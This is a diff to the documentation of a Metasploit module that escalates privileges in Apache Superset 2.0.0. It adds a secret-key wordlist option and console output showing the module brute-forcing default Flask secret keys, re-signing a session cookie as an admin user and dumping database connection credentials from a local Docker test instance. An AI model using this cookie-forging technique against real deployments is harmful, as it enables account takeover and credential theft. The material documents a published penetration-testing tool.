@@ -45,17 +45,20 @@ The username to authenticate as. Required with no default.
 
 The password for the specified username. Required with no default.
 
-
 ### ADMIN_ID
 
 The ID of an admin account. Defaults to `1`
+
+### SECRET_KEYS_FILE
+
+A file containing secret keys to try. One per line. Defaults to `metasploit-framework/data/wordlists/superset_secret_keys.tx`
 
 ## Scenarios
 
 ### Superset 2.0.0 Docker image
 
 ```
-msf6 > use auxiliary/gather/apache_superset_priv_esc 
+msf6 > use auxiliary/gather/apache_superset_cookie_sig_priv_esc 
 msf6 auxiliary(gather/apache_superset_priv_esc) > set rhosts 127.0.0.1
 rhosts => 127.0.0.1
 msf6 auxiliary(gather/apache_superset_priv_esc) > set username user
@@ -68,20 +71,22 @@ msf6 auxiliary(gather/apache_superset_priv_esc) > run
 [*] Running module against 127.0.0.1
 
 [*] Running automatic check ("set AutoCheck false" to disable)
-[+] The target is vulnerable. Apache Supset 2.0.0 is vulnerable
-[*] 127.0.0.1:8088 - CSRF Token: ImQ2NDBmM2RlZTcyYjA5MzFiMDE4MjMwYWI4N2QxNzY1NGY0ZTBmZWYi.ZK2qOQ.c-LssFFTxWJKoQZ7v1Sex8q-xy0
-[*] 127.0.0.1:8088 - Initial Cookie: session=eyJjc3JmX3Rva2VuIjoiZDY0MGYzZGVlNzJiMDkzMWIwMTgyMzBhYjg3ZDE3NjU0ZjRlMGZlZiIsImxvY2FsZSI6ImVuIn0.ZK2qOQ.oXIWtpT7OItq7Vmr-00Prtl4Pmg;
-[*] 127.0.0.1:8088 - Decoded Cookie: {"csrf_token"=>"d640f3dee72b0931b018230ab87d17654f4e0fef", "locale"=>"en"}
+[+] The target appears to be vulnerable. Apache Supset 2.0.0 is vulnerable
+[*] 127.0.0.1:8088 - CSRF Token: IjkzNDBmZmI4ZDc4M2I4NWNiYzlmNWQwOGM4NTcwZDUzZGVhZDMwZjEi.ZP8uyQ.iBpplhnMpXOZnjiV1Xh_reR_uLw
+[*] 127.0.0.1:8088 - Initial Cookie: session=eyJjc3JmX3Rva2VuIjoiOTM0MGZmYjhkNzgzYjg1Y2JjOWY1ZDA4Yzg1NzBkNTNkZWFkMzBmMSIsImxvY2FsZSI6ImVuIn0.ZP8uyQ.jHXs3u8dqoBUWeL1vjUTxXOWLAo;
+[*] 127.0.0.1:8088 - Decoded Cookie: {"csrf_token"=>"9340ffb8d783b85cbc9f5d08c8570d53dead30f1", "locale"=>"en"}
 [*] 127.0.0.1:8088 - Attempting login
-[+] 127.0.0.1:8088 - Logged in Cookie: session=.eJwlj0tqAzEQRO-itRf9G7XalxkkdTc2MTbM2KuQu0chy6Io6r3vsucR561c38cnLmW_e7mWMKE-qmR3UcdB0LB2EczOSC6VeCNBowruSYxjNdswtOnNY3BuuuG0VodSotpMVuzk6AlCDUcqayoYpIu3ZgLAjad1q4xRLmWeR-7v11c8F49XgWSPUBpg6w6wEUMfbdFp3SQlICPX7vGa_RF_Ds-VPmcc_0pUfn4BrnVCHw.ZK2qOQ.SCiqOSW_PTP9VPz2CfG_2IZmHyI;
-[*] 127.0.0.1:8088 - Modified cookie: {"_fresh"=>true, "_id"=>"e942ab64fad47d1b20816a441fa312d462352419260ddf231b1fa5b919cd8deb3f5751c986b72f179cf371a2d1df04281bf737f7090fd4d889400383c9a9631e", "csrf_token"=>"d640f3dee72b0931b018230ab87d17654f4e0fef", "locale"=>"en", "user_id"=>1}
-[*] Attempting to resign with key: thisismyscretkey\e\y\y\h
-[*] 127.0.0.1:8088 - New signed cookie: eyJfZnJlc2giOnRydWUsIl9pZCI6ImU5NDJhYjY0ZmFkNDdkMWIyMDgxNmE0NDFmYTMxMmQ0NjIzNTI0MTkyNjBkZGYyMzFiMWZhNWI5MTljZDhkZWIzZjU3NTFjOTg2YjcyZjE3OWNmMzcxYTJkMWRmMDQyODFiZjczN2Y3MDkwZmQ0ZDg4OTQwMDM4M2M5YTk2MzFlIiwiY3NyZl90b2tlbiI6ImQ2NDBmM2RlZTcyYjA5MzFiMDE4MjMwYWI4N2QxNzY1NGY0ZTBmZWYiLCJsb2NhbGUiOiJlbiIsInVzZXJfaWQiOjF9.ZK2qOQ.fv4N_O6m35thR0PFpOdy7E8MA_Y
-[-] 127.0.0.1:8088 - Cookie not accepted
-[*] Attempting to resign with key: CHANGE_ME_TO_A_COMPLEX_RANDOM_SECRET
-[*] 127.0.0.1:8088 - New signed cookie: eyJfZnJlc2giOnRydWUsIl9pZCI6ImU5NDJhYjY0ZmFkNDdkMWIyMDgxNmE0NDFmYTMxMmQ0NjIzNTI0MTkyNjBkZGYyMzFiMWZhNWI5MTljZDhkZWIzZjU3NTFjOTg2YjcyZjE3OWNmMzcxYTJkMWRmMDQyODFiZjczN2Y3MDkwZmQ0ZDg4OTQwMDM4M2M5YTk2MzFlIiwiY3NyZl90b2tlbiI6ImQ2NDBmM2RlZTcyYjA5MzFiMDE4MjMwYWI4N2QxNzY1NGY0ZTBmZWYiLCJsb2NhbGUiOiJlbiIsInVzZXJfaWQiOjF9.ZK2qOQ.XIvqgEv_nviSivPJjE73KOWKMEI
+[+] 127.0.0.1:8088 - Logged in Cookie: session=.eJwNjUEKwyAQRa8isw7FYiXGG3TXfQhhojMmdDCgoaWE3L2uHnx4_50ws2BdqYIfT1BHA3yx5C0n6OCZPyhbVLKnLd_USwgrqaP8FCZsC0zX1LWLQnUFzyiVOgi18Hzsb8rgYTAPzby42DuzOBuWMLCN2gVnex2tiYTRaL63mOwBhZrTxOsPSKAxLA.ZP8uyQ.UvNg89u5vOnyFiip1diP8ABrDCY;
+.eJwNjUEKwyAQRa8isw7FYiXGG3TXfQhhojMmdDCgoaWE3L2uHnx4_50ws2BdqYIfT1BHA3yx5C0n6OCZPyhbVLKnLd_USwgrqaP8FCZsC0zX1LWLQnUFzyiVOgi18Hzsb8rgYTAPzby42DuzOBuWMLCN2gVnex2tiYTRaL63mOwBhZrTxOsPSKAxLA.ZP8uyQ.UvNg89u5vOnyFiip1diP8ABrDCY
+[*] 127.0.0.1:8088 - Checking secret key: \x02\x01thisismyscretkey\x01\x02\\e\\y\\y\\h
+[-] 127.0.0.1:8088 - Incorrect Secret Key: \x02\x01thisismyscretkey\x01\x02\\e\\y\\y\\h
+[*] 127.0.0.1:8088 - Checking secret key: CHANGE_ME_TO_A_COMPLEX_RANDOM_SECRET
+[+] 127.0.0.1:8088 - Found secret key: CHANGE_ME_TO_A_COMPLEX_RANDOM_SECRET
+[*] 127.0.0.1:8088 - Modified cookie: {"_flashes"=>[{" t"=>["warning", "Invalid login. Please try again."]}], "_fresh"=>false, "csrf_token"=>"9340ffb8d783b85cbc9f5d08c8570d53dead30f1", "locale"=>"en", "user_id"=>1}
+[*] 127.0.0.1:8088 - Attempting to resign with key: CHANGE_ME_TO_A_COMPLEX_RANDOM_SECRET
+[*] 127.0.0.1:8088 - New signed cookie: eyJfZmxhc2hlcyI6W3siIHQiOlsid2FybmluZyIsIkludmFsaWQgbG9naW4uIFBsZWFzZSB0cnkgYWdhaW4uIl19XSwiX2ZyZXNoIjpmYWxzZSwiY3NyZl90b2tlbiI6IjkzNDBmZmI4ZDc4M2I4NWNiYzlmNWQwOGM4NTcwZDUzZGVhZDMwZjEiLCJsb2NhbGUiOiJlbiIsInVzZXJfaWQiOjF9.ZP8uyQ.7Rgp9a7iPK-m7NQRbWpixG62CMo
 [+] 127.0.0.1:8088 - Cookie validated to user: admin
-[+] Found mysql database exampledb: root:my-secret-pw@111.222.3.444:3306
+[+] Found Super Secret DB: postgresql://dbuser:mysecretpassword@1.1.1.1:15432/supersetdb
 [*] Done enumerating databases
 [*] Auxiliary module execution completed
 msf6 auxiliary(gather/apache_superset_priv_esc) > creds
